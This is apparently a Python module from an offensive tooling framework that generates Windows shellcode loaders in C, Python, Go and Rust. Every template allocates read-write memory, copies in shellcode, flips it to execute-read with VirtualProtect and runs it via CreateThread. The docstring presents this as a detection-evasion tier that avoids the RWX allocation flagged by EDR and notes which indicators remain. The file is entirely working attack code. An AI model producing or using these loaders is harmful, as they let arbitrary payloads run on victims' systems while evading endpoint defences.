"""Loader: win_rw_rx — VirtualAlloc(RW) → memcpy → VirtualProtect(RX) → CreateThread.

Tier 2. Removes the most-flagged indicator: RWX allocation.
Two-stage permission model:
  1. Allocate as RW (unremarkable; used constantly by legitimate code)
  2. Write shellcode
  3. Flip to RX via VirtualProtect (no write permission during execution)
  4. Execute via CreateThread

Still triggers on:
  - VirtualProtect(RX) on a non-image-backed region (flagged by many EDR)
  - CreateThread from non-image-backed page
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_rw_rx")

# {sc_embed}    — global declarations (encrypted array + key, or empty for staged)
# {sc_init}     — in-main init block (decrypt loop or file-reading code)
# {main_decl}   — main() signature (void or int argc, char *argv[])
_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

{sc_embed}

{main_decl} {{
    {sc_init}
    LPVOID mem = VirtualAlloc(NULL, sc_len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) {{
        fprintf(stderr, "[-] VirtualAlloc failed: %lu\\n", GetLastError());
        return 1;
    }}
    memcpy(mem, sc, sc_len);

    DWORD old_protect;
    if (!VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old_protect)) {{
        fprintf(stderr, "[-] VirtualProtect failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}

    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem,
                                  NULL, 0, NULL);
    if (!hThread) {{
        fprintf(stderr, "[-] CreateThread failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import sys

{sc_bytes}

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = ctypes.c_void_p
kernel32.CreateThread.restype = ctypes.c_void_p

mem = kernel32.VirtualAlloc(None, len(sc),
                            0x3000,   # MEM_COMMIT | MEM_RESERVE
                            0x04)     # PAGE_READWRITE
if not mem:
    sys.exit(1)

buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
kernel32.RtlMoveMemory(ctypes.c_void_p(mem), buf, len(sc))

old = ctypes.c_ulong(0)
if not kernel32.VirtualProtect(ctypes.c_void_p(mem), len(sc),
                                0x20,            # PAGE_EXECUTE_READ
                                ctypes.byref(old)):
    sys.exit(1)

ht = kernel32.CreateThread(None, 0, ctypes.c_void_p(mem), None, 0, None)
if not ht:
    sys.exit(1)
kernel32.WaitForSingleObject(ctypes.c_void_p(ht), 0xFFFFFFFF)
"""


# {sc_embed}    — package-level declarations (or empty for staged)
# {sc_init}     — first statement(s) in main (decrypt loop or file-reading)
# {sc_imports}  — extra import entries, e.g. \n\t"os" for staged
_GO_TEMPLATE = """\
package main

import (
\t"syscall"
\t"unsafe"{sc_imports}
)

{sc_embed}

func main() {{
\t{sc_init}
\tk32             := syscall.NewLazyDLL("kernel32.dll")
\tpVirtualAlloc   := k32.NewProc("VirtualAlloc")
\tpVirtualFree    := k32.NewProc("VirtualFree")
\tpVirtualProtect := k32.NewProc("VirtualProtect")
\tpCreateThread   := k32.NewProc("CreateThread")
\tpWaitSingle     := k32.NewProc("WaitForSingleObject")
\tpRtlMove        := k32.NewProc("RtlMoveMemory")

\taddr, _, _ := pVirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x04)
\tif addr == 0 {{
\t\treturn
\t}}
\tpRtlMove.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
\tvar old uint32
\tpVirtualProtect.Call(addr, uintptr(len(sc)), 0x20, uintptr(unsafe.Pointer(&old)))
\tht, _, _ := pCreateThread.Call(0, 0, addr, 0, 0, 0)
\tif ht == 0 {{
\t\tpVirtualFree.Call(addr, 0, 0x8000)
\t\treturn
\t}}
\tpWaitSingle.Call(ht, 0xFFFFFFFF)
\tpVirtualFree.Call(addr, 0, 0x8000)
}}
"""

# {sc_bytes} is inside fn main() — single block (decl + decrypt or file-read)
_RS_TEMPLATE = """\
#![allow(non_snake_case)]
use std::ptr;

#[link(name = "kernel32")]
extern "system" {{
    fn VirtualAlloc(lpAddress: *mut u8, dwSize: usize, flAllocationType: u32,
                    flProtect: u32) -> *mut u8;
    fn VirtualFree(lpAddress: *mut u8, dwSize: usize, dwFreeType: u32) -> i32;
    fn VirtualProtect(lpAddress: *mut u8, dwSize: usize, flNewProtect: u32,
                      lpflOldProtect: *mut u32) -> i32;
    fn CreateThread(lpThreadAttributes: *mut u8, dwStackSize: usize,
                    lpStartAddress: unsafe extern "system" fn(*mut u8) -> u32,
                    lpParameter: *mut u8, dwCreationFlags: u32,
                    lpThreadId: *mut u32) -> *mut u8;
    fn WaitForSingleObject(hHandle: *mut u8, dwMilliseconds: u32) -> u32;
    fn CloseHandle(hObject: *mut u8) -> i32;
}}

fn main() {{
    {sc_bytes}
    unsafe {{
        let p = VirtualAlloc(ptr::null_mut(), sc.len(), 0x3000, 0x04);
        if p.is_null() {{ return; }}
        ptr::copy_nonoverlapping(sc.as_ptr(), p, sc.len());
        let mut old: u32 = 0;
        if VirtualProtect(p, sc.len(), 0x20, &mut old) == 0 {{
            VirtualFree(p, 0, 0x8000); return;
        }}
        let entry: unsafe extern "system" fn(*mut u8) -> u32 = std::mem::transmute(p);
        let ht = CreateThread(ptr::null_mut(), 0, entry, ptr::null_mut(), 0, ptr::null_mut());
        if ht.is_null() {{ VirtualFree(p, 0, 0x8000); return; }}
        WaitForSingleObject(ht, 0xFFFFFFFF);
        CloseHandle(ht);
        VirtualFree(p, 0, 0x8000);
    }}
}}
"""


def generate_c(shellcode: bytes, staged: bool = False) -> str:
    """Return a compilable C loader using VirtualAlloc(RW) -> VirtualProtect(RX) -> CreateThread."""
    if staged:
        embed, init = _render.c_staged_sc("sc")
        main_decl = "int main(int argc, char *argv[])"
    else:
        embed, init = _render.c_sc_block(shellcode, "sc")
        main_decl = "int main(void)"
    return _C_TEMPLATE.format(sc_embed=embed, sc_init=init, main_decl=main_decl)


def generate_python(shellcode: bytes, staged: bool = False) -> str:
    """Return a Python ctypes loader using VirtualAlloc(RW) -> VirtualProtect(RX) -> CreateThread."""
    sc_bytes = _render.py_staged_sc("sc") if staged else _render.py_sc_block(shellcode, "sc")
    return _PY_TEMPLATE.format(sc_bytes=sc_bytes)


def generate_go(shellcode: bytes, staged: bool = False) -> str:
    """Return a Go loader using VirtualAlloc(RW) -> VirtualProtect(RX) -> CreateThread."""
    if staged:
        embed, init, imports = _render.go_staged_sc("sc")
    else:
        embed, init, imports = _render.go_sc_block(shellcode, "sc")
    return _GO_TEMPLATE.format(sc_embed=embed, sc_init=init, sc_imports=imports)


def generate_rust(shellcode: bytes, staged: bool = False) -> str:
    """Return a Rust loader using VirtualAlloc(RW) -> VirtualProtect(RX) -> CreateThread."""
    sc_bytes = _render.rust_staged_sc("sc") if staged else _render.rust_sc_block(shellcode, "sc")
    return _RS_TEMPLATE.format(sc_bytes=sc_bytes)
